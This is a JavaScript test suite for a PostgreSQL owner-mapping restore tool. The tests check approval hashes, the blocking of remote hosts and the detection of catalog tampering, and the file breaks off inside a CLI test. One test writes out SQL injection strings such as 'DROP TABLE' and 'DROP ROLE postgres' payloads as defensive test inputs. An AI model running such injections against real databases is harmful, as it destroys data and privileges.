import test from 'node:test';
import assert from 'node:assert/strict';
import fsp from 'node:fs/promises';
import path from 'node:path';
import os from 'node:os';
import crypto from 'node:crypto';
import { spawn } from 'node:child_process';
import {
  OWNER_MAP_FORMAT,
  DEFAULT_TARGET_IDENTITY,
  APPROVED_CONTAINERS,
  HelperError,
  parseJsonStrict,
  validateRoleIdentifier,
  parseObjectIdentity,
  validateTargetInventory,
  validateRoutineEntry,
  validateTargetIsolation,
  getSanitizedChildEnv,
  verifyDatabaseTargetIdentity,
  generateAlterOwnerStatement,
  generateOwnerMapPlan,
  handlePlanCommand,
  handleApplyCommand,
  handleVerifyCommand,
  sha256Hex,
  parseAndValidateDockerEndpoint,
  getDockerConfigRoot,
  resolveDockerContextEndpoint,
  resolveEffectiveDockerEndpoint,
  validateMetadataIdentifier,
  validatePlanSqlGrammar,
  quoteIdent,
  extractRoleNames,
} from '../../scripts/backup/owner-map.mjs';

// -----------------------------------------------------------------------------
// Test Helpers & Fixtures
// -----------------------------------------------------------------------------

async function createTempDir(prefix = 'owner-map-test-') {
  return await fsp.mkdtemp(path.join(os.tmpdir(), prefix));
}

async function removeTempDir(dirPath) {
  try {
    await fsp.rm(dirPath, { recursive: true, force: true });
  } catch {
    // Best-effort cleanup
  }
}

function runCli(args, env = process.env) {
  return new Promise((resolve) => {
    const cliPath = path.resolve('scripts/backup/owner-map.mjs');
    const child = spawn(process.execPath, [cliPath, ...args], {
      env: { ...process.env, ...env },
      stdio: ['pipe', 'pipe', 'pipe'],
    });

    let stdout = '';
    let stderr = '';

    child.stdout.on('data', (d) => { stdout += d.toString(); });
    child.stderr.on('data', (d) => { stderr += d.toString(); });

    child.on('close', (code) => {
      resolve({ code, stdout, stderr });
    });
  });
}

function runDockerPsql(container, sql) {
  return new Promise((resolve, reject) => {
    const child = spawn('docker', ['exec', '-i', container, 'psql', '-X', '-qAt', '-v', 'ON_ERROR_STOP=1', '-U', 'supabase_admin', '-d', 'postgres'], {
      stdio: ['pipe', 'pipe', 'pipe'],
    });
    let stdout = '';
    let stderr = '';
    child.stdout.on('data', (d) => { stdout += d.toString(); });
    child.stderr.on('data', (d) => { stderr += d.toString(); });
    child.on('error', reject);
    child.on('close', (code) => {
      if (code !== 0) {
        reject(new Error(`Docker psql failed (${code}): ${stderr || stdout}`));
      } else {
        resolve({ stdout, stderr });
      }
    });
    child.stdin.write(sql);
    child.stdin.end();
  });
}

async function isDockerContainerAvailable(containerName, opts = {}) {
  // Preflight Safety Gate must run BEFORE any Docker invocation (R2-P1-02, R2-P2-02, R3-P2-01, R5.2)
  if (!containerName || typeof containerName !== 'string' || !APPROVED_CONTAINERS.has(containerName.trim())) {
    return false;
  }
  const effective = resolveEffectiveDockerEndpoint({
    env: process.env,
    contextInspector: opts.contextInspector,
    activeContextResolver: opts.activeContextResolver,
  });
  if (!effective.rawEndpoint) return false;
  const ep = parseAndValidateDockerEndpoint(effective.rawEndpoint);
  if (!ep.isLocal) return false;

  try {
    const { stdout } = await runDockerPsql(containerName, 'SELECT 1;');
    return stdout.trim() === '1';
  } catch {
    return false;
  }
}

/**
 * Preflight Safety Gate for Live Disposable Test Instance (P1-03, R2-P1-02, R5.2 Finding P1)
 */
async function verifyDisposableTestTarget(container, psqlRunner = runDockerPsql, opts = {}) {
  // 1. Validate Docker daemon environment with rigorous parser (effective endpoint check)
  const effective = resolveEffectiveDockerEndpoint({
    env: process.env,
    contextInspector: opts.contextInspector,
    activeContextResolver: opts.activeContextResolver,
  });
  if (!effective.rawEndpoint) {
    throw new HelperError('REMOTE_DOCKER_CONTEXT_BLOCKED', `unable to verify actual endpoint for Docker ${effective.context ? `context '${effective.context}'` : 'daemon'}. Fail closed.`);
  }
  const ep = parseAndValidateDockerEndpoint(effective.rawEndpoint);
  if (!ep.isLocal) {
    if (effective.source === 'DOCKER_HOST') {
      throw new HelperError('REMOTE_DOCKER_HOST_BLOCKED', `remote DOCKER_HOST blocked: ${effective.rawEndpoint}`);
    }
    throw new HelperError('REMOTE_DOCKER_CONTEXT_BLOCKED', `remote DOCKER_CONTEXT blocked: ${effective.context || effective.rawEndpoint}`);
  }

  // 2. Validate container is approved test instance
  if (!APPROVED_CONTAINERS.has(container)) {
    throw new HelperError('UNAPPROVED_CONTAINER', `container '${container}' is not an approved test target`);
  }

  // 3. Query PostgreSQL version and database-side disposable marker
  const sql = `
SELECT json_build_object(
  'version_num', current_setting('server_version_num')::integer,
  'database', current_database(),
  'has_marker_table', EXISTS(
    SELECT 1 FROM information_schema.tables 
    WHERE table_schema = 'public' 
      AND (table_name = '_crm_disposable_test_marker' OR table_name = '_crm_rehearsal_sentinel')
  ),
  'db_comment', coalesce((SELECT description FROM pg_shdescription s JOIN pg_database d ON d.oid = s.objoid WHERE d.datname = current_database()), '')
)::text;
`;

  const { stdout } = await psqlRunner(container, sql);
  const info = JSON.parse(stdout.trim());

  if (info.version_num < 170000) {
    throw new HelperError('UNSUPPORTED_POSTGRES_VERSION', `PostgreSQL 17+ is required; detected server_version_num ${info.version_num}`);
  }

  const hasMarker = info.has_marker_table || info.db_comment.includes('disposable-test');
  if (!hasMarker) {
    throw new HelperError('DISPOSABLE_TEST_MARKER_MISSING', 'database-side disposable-test marker is missing. Refusing to run destructive operations on unverified target.');
  }

  return info;
}

// -----------------------------------------------------------------------------
// Base Synthetic Fixtures
// -----------------------------------------------------------------------------

const BASE_SOURCE_REF = 'qmhfmgkymjgoevwmkidm';
const BASE_TARGET_REF = 'crm-restore-rehearsal';

const BASE_VALID_INVENTORY = [
  { objectType: 'schema', identity: 'public', sourceOwner: 'old_admin' },
  { objectType: 'table', identity: 'public.customers', sourceOwner: 'old_admin' },
  { objectType: 'partitioned_table', identity: 'public.orders_partitioned', sourceOwner: 'old_admin' },
  { objectType: 'foreign_table', identity: 'public.remote_logs', sourceOwner: 'old_admin' },
  { objectType: 'sequence', identity: 'public.customers_id_seq', sourceOwner: 'old_admin' },
  { objectType: 'view', identity: 'public.v_customers', sourceOwner: 'old_admin' },
  { objectType: 'materialized_view', identity: 'public.mv_summary', sourceOwner: 'old_admin' },
  { objectType: 'type', identity: 'public.order_status', sourceOwner: 'old_admin' },
  { objectType: 'domain', identity: 'public.email_type', sourceOwner: 'old_admin' },
  { objectType: 'function', identity: 'public.calc_discount(integer, numeric)', sourceOwner: 'old_admin' },
  { objectType: 'procedure', identity: 'public.purge_old_data(integer)', sourceOwner: 'old_admin' },
];

const BASE_VALID_MAP = {
  format: OWNER_MAP_FORMAT,
  sourceProjectRef: BASE_SOURCE_REF,
  target: BASE_TARGET_REF,
  mappings: [
    {
      sourceOwner: 'old_admin',
      targetOwner: 'restore_admin',
      reason: 'Security-equivalent local restore role',
      approvedBy: 'database-reviewer',
    },
  ],
};

const BASE_TARGET_ROLES = {
  roles: [
    { name: 'postgres' },
    { name: 'supabase_admin' },
    { name: 'restore_admin' },
  ],
};

const BASE_VALID_CATALOG_DETAILS = {
  routines: [
    {
      schema: 'public',
      identity: 'public.calc_discount(integer, numeric)',
      owner: 'old_admin',
      securityDefiner: false,
      config: ['search_path=public'],
      acl: null,
    },
    {
      schema: 'public',
      identity: 'public.purge_old_data(integer)',
      owner: 'old_admin',
      securityDefiner: false,
      config: null,
      acl: null,
    },
  ],
};

const BASE_TARGET_CATALOG_DETAILS = {
  routines: [
    {
      schema: 'public',
      identity: 'public.calc_discount(integer, numeric)',
      owner: 'restore_admin',
      securityDefiner: false,
      config: ['search_path=public'],
      acl: null,
    },
    {
      schema: 'public',
      identity: 'public.purge_old_data(integer)',
      owner: 'restore_admin',
      securityDefiner: false,
      config: null,
      acl: null,
    },
  ],
};

// -----------------------------------------------------------------------------
// Test Suite: 20 Mandatory Requirement Categories
// -----------------------------------------------------------------------------

test('1. Valid owner mapping: generates deterministic plan, verifies all 11 supported object types', async () => {
  const result = generateOwnerMapPlan({
    inventoryData: BASE_VALID_INVENTORY,
    ownerMapData: BASE_VALID_MAP,
    targetRolesData: BASE_TARGET_ROLES,
    expectedProjectRef: BASE_SOURCE_REF,
    expectedTarget: BASE_TARGET_REF,
  });

  assert.equal(result.objectCount, 11);
  assert.ok(result.planSha256);
  assert.match(result.sqlText, /^-- CRM Owner Map Plan \(Deterministic\)/);
  assert.match(result.sqlText, /\nBEGIN;\n/);
  assert.match(result.sqlText, /\nCOMMIT;\n$/);

  // Check that all 11 object types received correct ALTER statements
  assert.ok(result.sqlText.includes('ALTER SCHEMA "public" OWNER TO "restore_admin";'));
  assert.ok(result.sqlText.includes('ALTER TABLE "public"."customers" OWNER TO "restore_admin";'));
  assert.ok(result.sqlText.includes('ALTER TABLE "public"."orders_partitioned" OWNER TO "restore_admin";'));
  assert.ok(result.sqlText.includes('ALTER FOREIGN TABLE "public"."remote_logs" OWNER TO "restore_admin";'));
  assert.ok(result.sqlText.includes('ALTER SEQUENCE "public"."customers_id_seq" OWNER TO "restore_admin";'));
  assert.ok(result.sqlText.includes('ALTER VIEW "public"."v_customers" OWNER TO "restore_admin";'));
  assert.ok(result.sqlText.includes('ALTER MATERIALIZED VIEW "public"."mv_summary" OWNER TO "restore_admin";'));
  assert.ok(result.sqlText.includes('ALTER TYPE "public"."order_status" OWNER TO "restore_admin";'));
  assert.ok(result.sqlText.includes('ALTER DOMAIN "public"."email_type" OWNER TO "restore_admin";'));
  assert.ok(result.sqlText.includes('ALTER FUNCTION "public"."calc_discount"(integer, numeric) OWNER TO "restore_admin";'));
  assert.ok(result.sqlText.includes('ALTER PROCEDURE "public"."purge_old_data"(integer) OWNER TO "restore_admin";'));
});

test('2. Missing source-owner mapping: fails closed when an inventory owner has no mapping', () => {
  const inventoryWithExtraOwner = [
    ...BASE_VALID_INVENTORY,
    { objectType: 'table', identity: 'public.unmapped_table', sourceOwner: 'unmapped_user' },
  ];

  assert.throws(
    () => {
      generateOwnerMapPlan({
        inventoryData: inventoryWithExtraOwner,
        ownerMapData: BASE_VALID_MAP,
        targetRolesData: BASE_TARGET_ROLES,
      });
    },
    (err) => {
      assert.ok(err instanceof HelperError);
      assert.equal(err.code, 'MISSING_OWNER_MAPPING');
      assert.match(err.message, /unmapped_user/);
      return true;
    },
  );
});

test('3. Duplicate source owner in owner-map: fails closed with DUPLICATE_OWNER_MAPPING', () => {
  const duplicateMap = {
    ...BASE_VALID_MAP,
    mappings: [
      {
        sourceOwner: 'old_admin',
        targetOwner: 'restore_admin',
        reason: 'Primary mapping',
        approvedBy: 'reviewer1',
      },
      {
        sourceOwner: 'old_admin',
        targetOwner: 'alt_admin',
        reason: 'Duplicate conflicting mapping',
        approvedBy: 'reviewer2',
      },
    ],
  };

  assert.throws(
    () => {
      generateOwnerMapPlan({
        inventoryData: BASE_VALID_INVENTORY,
        ownerMapData: duplicateMap,
        targetRolesData: BASE_TARGET_ROLES,
      });
    },
    (err) => {
      assert.ok(err instanceof HelperError);
      assert.equal(err.code, 'DUPLICATE_OWNER_MAPPING');
      return true;
    },
  );
});

test('4. Unknown source owner in owner-map: fails closed when mapping defines an owner absent from inventory', () => {
  const extraMappingMap = {
    ...BASE_VALID_MAP,
    mappings: [
      ...BASE_VALID_MAP.mappings,
      {
        sourceOwner: 'ghost_source_owner',
        targetOwner: 'restore_admin',
        reason: 'Spurious mapping',
        approvedBy: 'reviewer',
      },
    ],
  };

  assert.throws(
    () => {
      generateOwnerMapPlan({
        inventoryData: BASE_VALID_INVENTORY,
        ownerMapData: extraMappingMap,
        targetRolesData: BASE_TARGET_ROLES,
      });
    },
    (err) => {
      assert.ok(err instanceof HelperError);
      assert.equal(err.code, 'UNKNOWN_SOURCE_OWNER');
      assert.match(err.message, /ghost_source_owner/);
      return true;
    },
  );
});

test('5. Nonexistent target role: fails closed when target role does not exist in target inventory', () => {
  const invalidTargetMap = {
    ...BASE_VALID_MAP,
    mappings: [
      {
        sourceOwner: 'old_admin',
        targetOwner: 'nonexistent_role_xyz',
        reason: 'Invalid role test',
        approvedBy: 'reviewer',
      },
    ],
  };

  assert.throws(
    () => {
      generateOwnerMapPlan({
        inventoryData: BASE_VALID_INVENTORY,
        ownerMapData: invalidTargetMap,
        targetRolesData: BASE_TARGET_ROLES,
      });
    },
    (err) => {
      assert.ok(err instanceof HelperError);
      assert.equal(err.code, 'NONEXISTENT_TARGET_ROLE');
      assert.match(err.message, /nonexistent_role_xyz/);
      return true;
    },
  );
});

test('6. Invalid project/target identity: fails closed on format, projectRef, or target mismatch', () => {
  // Bad format
  assert.throws(
    () => {
      generateOwnerMapPlan({
        inventoryData: BASE_VALID_INVENTORY,
        ownerMapData: { ...BASE_VALID_MAP, format: 'crm-owner-map/v2' },
        targetRolesData: BASE_TARGET_ROLES,
      });
    },
    (err) => {
      assert.equal(err.code, 'INVALID_FORMAT');
      return true;
    },
  );

  // Mismatched sourceProjectRef
  assert.throws(
    () => {
      generateOwnerMapPlan({
        inventoryData: BASE_VALID_INVENTORY,
        ownerMapData: BASE_VALID_MAP,
        targetRolesData: BASE_TARGET_ROLES,
        expectedProjectRef: 'different-project-id',
      });
    },
    (err) => {
      assert.equal(err.code, 'PROJECT_REF_MISMATCH');
      return true;
    },
  );

  // Mismatched target
  assert.throws(
    () => {
      generateOwnerMapPlan({
        inventoryData: BASE_VALID_INVENTORY,
        ownerMapData: BASE_VALID_MAP,
        targetRolesData: BASE_TARGET_ROLES,
        expectedTarget: 'unexpected-target-stack',
      });
    },
    (err) => {
      assert.equal(err.code, 'TARGET_IDENTITY_MISMATCH');
      return true;
    },
  );
});

test('7. Duplicate JSON keys: strict parser rejects root, nested, and escaped duplicate keys', () => {
  // Direct duplicate key at root
  assert.throws(
    () => {
      parseJsonStrict('{"format": "crm-owner-map/v1", "format": "crm-owner-map/v1"}');
    },
    (err) => {
      assert.equal(err.code, 'JSON_PARSE_ERROR');
      assert.match(err.message, /duplicate JSON key: format/);
      return true;
    },
  );

  // Escaped duplicate key
  assert.throws(
    () => {
      parseJsonStrict('{"target": "rehearsal", "\\u0074\\u0061\\u0072\\u0067\\u0065\\u0074": "rehearsal"}');
    },
    (err) => {
      assert.equal(err.code, 'JSON_PARSE_ERROR');
      assert.match(err.message, /duplicate JSON key: target/);
      return true;
    },
  );

  // Nested duplicate key inside mapping
  assert.throws(
    () => {
      parseJsonStrict('{"mappings": [{"sourceOwner": "a", "sourceOwner": "b"}]}');
    },
    (err) => {
      assert.equal(err.code, 'JSON_PARSE_ERROR');
      assert.match(err.message, /duplicate JSON key: sourceOwner/);
      return true;
    },
  );
});

test('8. SQL injection hardening: rejects injections in schema, table, function, and role identifiers', () => {
  // Injection in table identity
  assert.throws(
    () => {
      parseObjectIdentity('table', 'public.users; DROP TABLE sensitive; --');
    },
    (err) => {
      assert.equal(err.code, 'SQL_INJECTION_DETECTED');
      return true;
    },
  );

  // Injection in schema identity
  assert.throws(
    () => {
      parseObjectIdentity('schema', 'public; DROP SCHEMA public CASCADE;');
    },
    (err) => {
      assert.equal(err.code, 'SQL_INJECTION_DETECTED');
      return true;
    },
  );

  // Injection in function arguments
  assert.throws(
    () => {
      parseObjectIdentity('function', 'public.foo(int); DROP TABLE secrets; --');
    },
    (err) => {
      assert.equal(err.code, 'SQL_INJECTION_DETECTED');
      return true;
    },
  );

  assert.throws(
    () => {
      parseObjectIdentity('function', 'public.foo(a int, b text; DROP TABLE secrets)');
    },
    (err) => {
      assert.equal(err.code, 'SQL_INJECTION_DETECTED');
      return true;
    },
  );

  // Injection in role name
  assert.throws(
    () => {
      validateRoleIdentifier('target_user; DROP ROLE postgres; --');
    },
    (err) => {
      assert.equal(err.code, 'SQL_INJECTION_DETECTED');
      return true;
    },
  );

  // Null byte injection in identity
  assert.throws(
    () => {
      parseObjectIdentity('table', 'public.users\0evil');
    },
    (err) => {
      assert.equal(err.code, 'SQL_INJECTION_DETECTED');
      return true;
    },
  );
});

test('9. Function/procedure overload resolution: distinguishes overloaded functions with exact arguments', () => {
  const overloadInventory = [
    { objectType: 'function', identity: 'public.calculate(integer)', sourceOwner: 'old_admin' },
    { objectType: 'function', identity: 'public.calculate(integer, numeric)', sourceOwner: 'old_admin' },
    { objectType: 'function', identity: 'public.calculate(text)', sourceOwner: 'old_admin' },
    { objectType: 'procedure', identity: 'public.do_sync(boolean, text)', sourceOwner: 'old_admin' },
  ];

  const plan = generateOwnerMapPlan({
    inventoryData: overloadInventory,
    ownerMapData: BASE_VALID_MAP,
    targetRolesData: BASE_TARGET_ROLES,
  });

  assert.ok(plan.sqlText.includes('ALTER FUNCTION "public"."calculate"(integer) OWNER TO "restore_admin";'));
  assert.ok(plan.sqlText.includes('ALTER FUNCTION "public"."calculate"(integer, numeric) OWNER TO "restore_admin";'));
  assert.ok(plan.sqlText.includes('ALTER FUNCTION "public"."calculate"(text) OWNER TO "restore_admin";'));
  assert.ok(plan.sqlText.includes('ALTER PROCEDURE "public"."do_sync"(boolean, text) OWNER TO "restore_admin";'));
});

test('10. Deterministic SQL generation: identical byte-for-byte output regardless of input array ordering', () => {
  // Shuffle inventory
  const shuffledInventory = [...BASE_VALID_INVENTORY].reverse();

  const plan1 = generateOwnerMapPlan({
    inventoryData: BASE_VALID_INVENTORY,
    ownerMapData: BASE_VALID_MAP,
    targetRolesData: BASE_TARGET_ROLES,
  });

  const plan2 = generateOwnerMapPlan({
    inventoryData: shuffledInventory,
    ownerMapData: BASE_VALID_MAP,
    targetRolesData: BASE_TARGET_ROLES,
  });

  assert.equal(plan1.sqlText, plan2.sqlText);
  assert.equal(plan1.planSha256, plan2.planSha256);
});

test('11. Missing approval hash: apply fails closed when --approved-sha256 is missing', async () => {
  const tmpDir = await createTempDir();
  try {
    const planFile = path.join(tmpDir, 'plan.sql');
    await fsp.writeFile(planFile, 'BEGIN;\nCOMMIT;\n');

    await assert.rejects(
      async () => {
        await handleApplyCommand({
          planPath: planFile,
          approvedSha256: null,
        });
      },
      (err) => {
        assert.ok(err instanceof HelperError);
        assert.equal(err.code, 'MISSING_APPROVAL_HASH');
        return true;
      },
    );
  } finally {
    await removeTempDir(tmpDir);
  }
});

test('12. Incorrect approval hash: apply fails closed before database connection', async () => {
  const tmpDir = await createTempDir();
  try {
    const planFile = path.join(tmpDir, 'plan.sql');
    await fsp.writeFile(planFile, 'BEGIN;\nCOMMIT;\n');

    const incorrectSha = '0000000000000000000000000000000000000000000000000000000000000000';

    await assert.rejects(
      async () => {
        await handleApplyCommand({
          planPath: planFile,
          approvedSha256: incorrectSha,
        });
      },
      (err) => {
        assert.ok(err instanceof HelperError);
        assert.equal(err.code, 'APPROVAL_HASH_MISMATCH');
        return true;
      },
    );
  } finally {
    await removeTempDir(tmpDir);
  }
});

test('13. Plan modified after approval: apply fails closed when plan bytes on disk are altered', async () => {
  const tmpDir = await createTempDir();
  try {
    const planFile = path.join(tmpDir, 'plan.sql');
    const originalContent = 'BEGIN;\nALTER SCHEMA "public" OWNER TO "restore_admin";\nCOMMIT;\n';
    await fsp.writeFile(planFile, originalContent);
    const approvedHash = sha256Hex(originalContent);

    // Tamper with plan file
    await fsp.writeFile(planFile, originalContent + '-- tampered trailing comment\n');

    await assert.rejects(
      async () => {
        await handleApplyCommand({
          planPath: planFile,
          approvedSha256: approvedHash,
        });
      },
      (err) => {
        assert.ok(err instanceof HelperError);
        assert.equal(err.code, 'APPROVAL_HASH_MISMATCH');
        return true;
      },
    );
  } finally {
    await removeTempDir(tmpDir);
  }
});

test('14. Target identity and remote host mismatch: rejects remote endpoints and mismatched targets', async () => {
  const tmpDir = await createTempDir();
  try {
    const planFile = path.join(tmpDir, 'plan.sql');
    const content = 'BEGIN;\nCOMMIT;\n';
    await fsp.writeFile(planFile, content);
    const hash = sha256Hex(content);

    const mapFile = path.join(tmpDir, 'owner-map.json');
    await fsp.writeFile(mapFile, JSON.stringify(BASE_VALID_MAP));

    // Target label mismatch
    await assert.rejects(
      async () => {
        await handleApplyCommand({
          planPath: planFile,
          approvedSha256: hash,
          mapPath: mapFile,
          target: 'wrong-target-label',
        });
      },
      (err) => {
        assert.equal(err.code, 'TARGET_IDENTITY_MISMATCH');
        return true;
      },
    );

    // Remote cloud host blocked
    await assert.rejects(
      async () => {
        await handleApplyCommand({
          planPath: planFile,
          approvedSha256: hash,
          mapPath: mapFile,
          dbHost: 'db.qmhfmgkymjgoevwmkidm.supabase.co',
        });
      },
      (err) => {
        assert.equal(err.code, 'REMOTE_TARGET_BLOCKED');
        return true;
      },
    );

    // Cloud metadata endpoint blocked
    await assert.rejects(
      async () => {
        await handleApplyCommand({
          planPath: planFile,
          approvedSha256: hash,
          mapPath: mapFile,
          dbHost: '169.254.169.254',
        });
      },
      (err) => {
        assert.equal(err.code, 'REMOTE_TARGET_BLOCKED');
        return true;
      },
    );
  } finally {
    await removeTempDir(tmpDir);
  }
});

test('15. Apply rollback when SQL fails: transaction atomicity ensures partial changes revert', async () => {
  let executedStatements = null;
  const mockExecutor = async (sql) => {
    executedStatements = sql;
    throw new Error('relation "nonexistent_table" does not exist');
  };

  const tmpDir = await createTempDir();
  try {
    const planFile = path.join(tmpDir, 'plan.sql');
    const content = 'BEGIN;\nALTER SCHEMA "public" OWNER TO "restore_admin";\nALTER TABLE "public"."nonexistent_table" OWNER TO "restore_admin";\nCOMMIT;\n';
    await fsp.writeFile(planFile, content);
    const hash = sha256Hex(content);

    const mapFile = path.join(tmpDir, 'owner-map.json');
    await fsp.writeFile(mapFile, JSON.stringify(BASE_VALID_MAP));

    await assert.rejects(
      async () => {
        await handleApplyCommand({
          planPath: planFile,
          approvedSha256: hash,
          mapPath: mapFile,
          customExecutor: mockExecutor,
        });
      },
      (err) => {
        assert.match(err.message, /nonexistent_table/);
        return true;
      },
    );

    assert.ok(executedStatements.includes('BEGIN;'));
    assert.ok(executedStatements.includes('COMMIT;'));
  } finally {
    await removeTempDir(tmpDir);
  }
});

test('16. Post-apply owner mismatch: verify fails closed with status BLOCKED', async () => {
  const tmpDir = await createTempDir();
  try {
    const invFile = path.join(tmpDir, 'owner-inventory.json');
    await fsp.writeFile(invFile, JSON.stringify([
      { objectType: 'table', identity: 'public.customers', sourceOwner: 'old_admin' },
    ]));

    const mapFile = path.join(tmpDir, 'owner-map.json');
    await fsp.writeFile(mapFile, JSON.stringify(BASE_VALID_MAP));

    // Target object still has old owner
    const targetInvFile = path.join(tmpDir, 'target-inventory.json');
    await fsp.writeFile(targetInvFile, JSON.stringify([
      { objectType: 'table', identity: 'public.customers', currentOwner: 'old_admin' },
    ]));

    const reportFile = path.join(tmpDir, 'report.json');

    await assert.rejects(
      async () => {
        await handleVerifyCommand({
          inventoryPath: invFile,
          mapPath: mapFile,
          targetInventoryPath: targetInvFile,
          reportPath: reportFile,
        });
      },
      (err) => {
        assert.ok(err instanceof HelperError);
        assert.equal(err.code, 'VERIFICATION_BLOCKED');
        return true;
      },
    );

    const report = JSON.parse(await fsp.readFile(reportFile, 'utf8'));
    assert.equal(report.status, 'BLOCKED');
    assert.equal(report.discrepancies.length, 1);
    assert.equal(report.discrepancies[0].category, 'OWNER_MISMATCH');
  } finally {
    await removeTempDir(tmpDir);
  }
});

test('17. SECURITY DEFINER mismatch: verify detects altered prosecdef flag and sets status BLOCKED', async () => {
  const tmpDir = await createTempDir();
  try {
    const invFile = path.join(tmpDir, 'owner-inventory.json');
    await fsp.writeFile(invFile, JSON.stringify([
      { objectType: 'function', identity: 'public.secure_fn(integer)', sourceOwner: 'old_admin' },
    ]));

    const mapFile = path.join(tmpDir, 'owner-map.json');
    await fsp.writeFile(mapFile, JSON.stringify(BASE_VALID_MAP));

    const targetInvFile = path.join(tmpDir, 'target-inventory.json');
    await fsp.writeFile(targetInvFile, JSON.stringify([
      { objectType: 'function', identity: 'public.secure_fn(integer)', currentOwner: 'restore_admin' },
    ]));

    // Source catalog details has securityDefiner = true
    const srcCatFile = path.join(tmpDir, 'catalog-details.json');
    await fsp.writeFile(srcCatFile, JSON.stringify({
      routines: [
        {
          identity: 'public.secure_fn(integer)',
          owner: 'old_admin',
          securityDefiner: true,
          config: null,
          acl: null,
        },
      ],
    }));

    // Target catalog details has securityDefiner = false (tampered)
    const tgtCatFile = path.join(tmpDir, 'target-catalog-details.json');
    await fsp.writeFile(tgtCatFile, JSON.stringify({
      routines: [
        {
          identity: 'public.secure_fn(integer)',
          owner: 'restore_admin',
          securityDefiner: false,
          config: null,
          acl: null,
        },
      ],
    }));

    const reportFile = path.join(tmpDir, 'report.json');

    await assert.rejects(
      async () => {
        await handleVerifyCommand({
          inventoryPath: invFile,
          mapPath: mapFile,
          catalogDetailsPath: srcCatFile,
          targetInventoryPath: targetInvFile,
          targetCatalogDetailsPath: tgtCatFile,
          reportPath: reportFile,
        });
      },
      (err) => {
        assert.equal(err.code, 'VERIFICATION_BLOCKED');
        return true;
      },
    );

    const report = JSON.parse(await fsp.readFile(reportFile, 'utf8'));
    assert.equal(report.status, 'BLOCKED');
    assert.ok(report.discrepancies.some((d) => d.category === 'SECURITY_DEFINER_MISMATCH'));
  } finally {
    await removeTempDir(tmpDir);
  }
});

test('18. proconfig mismatch: verify detects altered function configuration GUCs and sets status BLOCKED', async () => {
  const tmpDir = await createTempDir();
  try {
    const invFile = path.join(tmpDir, 'owner-inventory.json');
    await fsp.writeFile(invFile, JSON.stringify([
      { objectType: 'function', identity: 'public.cfg_fn()', sourceOwner: 'old_admin' },
    ]));

    const mapFile = path.join(tmpDir, 'owner-map.json');
    await fsp.writeFile(mapFile, JSON.stringify(BASE_VALID_MAP));

    const targetInvFile = path.join(tmpDir, 'target-inventory.json');
    await fsp.writeFile(targetInvFile, JSON.stringify([
      { objectType: 'function', identity: 'public.cfg_fn()', currentOwner: 'restore_admin' },
    ]));

    const srcCatFile = path.join(tmpDir, 'catalog-details.json');
    await fsp.writeFile(srcCatFile, JSON.stringify({
      routines: [
        {
          identity: 'public.cfg_fn()',
          owner: 'old_admin',
          securityDefiner: false,
          config: ['search_path=public'],
          acl: null,
        },
      ],
    }));

    // Target has different config (e.g. altered search_path)
    const tgtCatFile = path.join(tmpDir, 'target-catalog-details.json');
    await fsp.writeFile(tgtCatFile, JSON.stringify({
      routines: [
        {
          identity: 'public.cfg_fn()',
          owner: 'restore_admin',
          securityDefiner: false,
          config: ['search_path=public,evil_schema'],
          acl: null,
        },
      ],
    }));

    const reportFile = path.join(tmpDir, 'report.json');

    await assert.rejects(
      async () => {
        await handleVerifyCommand({
          inventoryPath: invFile,
          mapPath: mapFile,
          catalogDetailsPath: srcCatFile,
          targetInventoryPath: targetInvFile,
          targetCatalogDetailsPath: tgtCatFile,
          reportPath: reportFile,
        });
      },
      (err) => {
        assert.equal(err.code, 'VERIFICATION_BLOCKED');
        return true;
      },
    );

    const report = JSON.parse(await fsp.readFile(reportFile, 'utf8'));
    assert.equal(report.status, 'BLOCKED');
    assert.ok(report.discrepancies.some((d) => d.category === 'PROCONFIG_MISMATCH'));
  } finally {
    await removeTempDir(tmpDir);
  }
});

test('19. EXECUTE ACL mismatch: verify detects altered execution privileges and sets status BLOCKED', async () => {
  const tmpDir = await createTempDir();
  try {
    const invFile = path.join(tmpDir, 'owner-inventory.json');
    await fsp.writeFile(invFile, JSON.stringify([
      { objectType: 'function', identity: 'public.acl_fn()', sourceOwner: 'old_admin' },
    ]));

    const mapFile = path.join(tmpDir, 'owner-map.json');
    await fsp.writeFile(mapFile, JSON.stringify(BASE_VALID_MAP));

    const targetInvFile = path.join(tmpDir, 'target-inventory.json');
    await fsp.writeFile(targetInvFile, JSON.stringify([
      { objectType: 'function', identity: 'public.acl_fn()', currentOwner: 'restore_admin' },
    ]));

    const srcCatFile = path.join(tmpDir, 'catalog-details.json');
    await fsp.writeFile(srcCatFile, JSON.stringify({
      routines: [
        {
          identity: 'public.acl_fn()',
          owner: 'old_admin',
          securityDefiner: false,
          config: null,
          acl: '{postgres=X/postgres,authenticated=X/postgres}',
        },
      ],
    }));

    // Target routine has modified ACL (e.g. granted to anon)
    const tgtCatFile = path.join(tmpDir, 'target-catalog-details.json');
    await fsp.writeFile(tgtCatFile, JSON.stringify({
      routines: [
        {
          identity: 'public.acl_fn()',
          owner: 'restore_admin',
          securityDefiner: false,
          config: null,
          acl: '{postgres=X/postgres,authenticated=X/postgres,anon=X/postgres}',
        },
      ],
    }));

    const reportFile = path.join(tmpDir, 'report.json');

    await assert.rejects(
      async () => {
        await handleVerifyCommand({
          inventoryPath: invFile,
          mapPath: mapFile,
          catalogDetailsPath: srcCatFile,
          targetInventoryPath: targetInvFile,
          targetCatalogDetailsPath: tgtCatFile,
          reportPath: reportFile,
        });
      },
      (err) => {
        assert.equal(err.code, 'VERIFICATION_BLOCKED');
        return true;
      },
    );

    const report = JSON.parse(await fsp.readFile(reportFile, 'utf8'));
    assert.equal(report.status, 'BLOCKED');
    assert.ok(report.discrepancies.some((d) => d.category === 'ACL_MISMATCH'));
  } finally {
    await removeTempDir(tmpDir);
  }
});

test('20. Unsupported object type: fails closed on unknown or disallowed object types', () => {
  const unsupportedTypes = ['index', 'aggregate', 'language', 'server', 'database', 'collation'];

  for (const badType of unsupportedTypes) {
    assert.throws(
      () => {
        generateOwnerMapPlan({
          inventoryData: [
            { objectType: badType, identity: `public.some_${badType}`, sourceOwner: 'old_admin' },
          ],
          ownerMapData: BASE_VALID_MAP,
          targetRolesData: BASE_TARGET_ROLES,
        });
      },
      (err) => {
        assert.ok(err instanceof HelperError);
        assert.equal(err.code, 'UNSUPPORTED_OBJECT_TYPE');
        return true;
      },
    );
  }
});

// -----------------------------------------------------------------------------
// Additional Edge Cases & Security Checks
// -----------------------------------------------------------------------------

test('CLI integration: plan, apply, verify roundtrip via subprocess execution', async () => {
  const tmpDir = await createTempDir('owner-map-cli-');
  try {
    const invFile = path.join(tmpDir, 'owner-inventory.json');
